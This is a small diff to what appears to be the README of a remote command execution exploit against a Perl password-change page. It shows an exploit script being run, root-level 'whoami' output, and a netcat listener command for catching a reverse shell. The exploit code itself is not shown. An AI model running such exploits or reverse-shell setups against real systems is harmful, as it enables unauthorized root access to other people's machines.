@@ -12,6 +12,12 @@ $ python3 exploit.py 127.0.0.1 whoami
 &lt;p&gt;Your password has expired, and a new one must be chosen.<br>
 <strong>uid=0(root) gid=0(root) groups=0(root)</strong><br>
 &lt;/p&gt;
+```
+<h1>Error - Perl execution failed</h1>
+<p>Your password has expired, and a new one must be chosen.
+uid=0(root) gid=0(root) groups=0(root)
+</p>
+```
 <br>
 <h4>before running script start listener for connection in your machine</h4>
 <code>nc -nvlp [LPORT]</code> 
